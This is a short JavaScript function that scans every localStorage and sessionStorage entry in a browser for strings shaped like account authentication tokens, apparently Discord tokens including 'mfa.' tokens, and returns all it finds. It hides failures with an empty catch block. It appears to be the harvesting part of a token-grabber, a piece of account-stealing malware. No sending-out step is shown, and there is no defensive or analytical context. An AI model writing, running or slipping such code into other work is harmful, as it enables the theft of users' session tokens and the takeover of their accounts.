function extractTokenFromStorage() {
  const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g;
  const mfaRegex = /mfa\.[\w-]{84}/g;
  let tokens = [];

  try {
    // Check all localStorage keys
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      const val = localStorage.getItem(key);
      if (!val) continue;
      
      const tMatch = val.match(tokenRegex);
      const mMatch = val.match(mfaRegex);
      if (tMatch) tokens.push(...tMatch);
      if (mMatch) tokens.push(...mMatch);
    }

    // Check sessionStorage
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      const val = sessionStorage.getItem(key);
      if (!val) continue;
      
      const tMatch = val.match(tokenRegex);
      if (tMatch) tokens.push(...tMatch);
    }
  } catch(e) {}

  return [...new Set(tokens)];
}
